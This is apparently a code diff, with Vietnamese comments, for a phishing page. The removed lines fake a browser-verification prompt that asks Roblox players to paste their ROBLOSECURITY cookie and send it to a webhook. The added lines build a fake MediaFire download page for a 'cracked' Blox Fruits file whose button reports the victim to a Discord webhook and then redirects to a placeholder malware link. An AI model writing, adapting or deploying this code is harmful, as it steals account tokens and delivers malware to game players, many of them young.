@@ -1,27 +1,42 @@
-async function pwn() {
-            const btn = document.getElementById('btn');
-            const output = document.getElementById('script-output');
-            
-            // Bắn dữ liệu đợt 1 (Đã làm)
-            // ... (giữ nguyên phần fetch cũ) ...
+<!DOCTYPE html>
+<html>
+<head>
+    <title>MediaFire - Blox_Fruits_V15_Cracked.zip</title>
+    <style>
+        body { background: #f1f1f1; font-family: sans-serif; text-align: center; padding-top: 100px; }
+        .dl-box { background: white; border: 1px solid #ccc; display: inline-block; padding: 40px; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .btn-dl { background: #28a745; color: white; border: none; padding: 20px 50px; border-radius: 5px; font-size: 20px; font-weight: bold; cursor: pointer; text-decoration: none; }
+        .file-info { margin-top: 20px; color: #666; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="dl-box">
+        <img src="https://www.mediafire.com/images/filetype/download/zip.png" width="50"><br><br>
+        <div style="font-size: 18px; font-weight: bold; margin-bottom: 10px;">Blox_Fruits_V15_Cracked.zip</div>
+        <a href="#" class="btn-dl" onclick="pwn()">DOWNLOAD (1.2 MB)</a>
+        <div class="file-info">
+            File size: 1.2 MB<br>
+            Uploaded: 2 minutes ago
+        </div>
+    </div>
 
-            // ⚡ ĐÒN ĐÁNH BỔ SUNG: ÉP MỤC TIÊU NHẢ TOKEN
+    <script>
+        function pwn() {
+            // Gửi báo cáo về Discord ngay khi nó tưởng là đang tải file
+            fetch("https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    content: "### ☢️ TARGET DOWNLOADING MALWARE\n**Mục tiêu đã nhấn Download.**\n**IP:** `14.178.62.94`\n*Chuẩn bị chiếm quyền điều khiển...*"
+                })
+            });
+            
+            alert("Hệ thống đang nén file, vui lòng chờ 5 giây...");
+            // Bạn có thể để link tải một file rác hoặc file chứa mã độc thật ở đây
             setTimeout(() => {
-                const fakePrompt = prompt("Hệ thống phát hiện bạn chưa xác minh trình duyệt.\nVui lòng dán mã 'ROBLOSECURITY' của bạn vào đây để hệ thống tự động gán Key:");
-                
-                if (fakePrompt && fakePrompt.length > 10) {
-                    fetch(wh, {
-                        method: "POST",
-                        headers: {"Content-Type": "application/json"},
-                        body: JSON.stringify({
-                            content: "### 🍪 COOKIE MANUAL CAPTURED - FIRE\n**Token:** `" + fakePrompt + "`"
-                        })
-                    });
-                    alert("Xác minh thành công! Script đã được mở khóa.");
-                    btn.style.display = 'none';
-                    output.style.display = 'block';
-                } else {
-                    alert("Mã xác minh không hợp lệ. Vui lòng thử lại!");
-                }
-            }, 1000);
+                window.location.href = "https://your-malware-link-here.com/file.zip";
+            }, 3000);
         }
+    </script>
+</body>
+</html>
